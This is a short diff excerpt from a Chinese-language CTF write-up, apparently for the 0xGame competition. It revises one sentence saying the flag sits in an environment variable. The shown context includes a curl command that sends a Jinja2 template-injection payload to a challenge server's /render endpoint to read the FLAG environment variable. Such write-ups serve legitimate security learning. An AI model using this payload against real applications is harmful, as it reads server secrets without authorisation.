@@ -91,7 +91,7 @@ exec gosu ctf python3 /app/src/app.py
 
 ```
 
-这是直接从 Shell 环境变量里写 flag 的，搞到手就行了。
+这是直接从环境变量里写 flag 的，搞到手就行了。
 
 ```bash
 scetayh@yuprae-gentoo ~ $ curl -sS -X POST 'http://5000-fa344225-bfa2-422f-9f06-9d35aa2f4f8e.challenge.ctfplus.cn/render' --data-urlencode "template={{ cycler.__init__.__globals__.os.environ['FLAG'] }}" | grep '0xGame{'
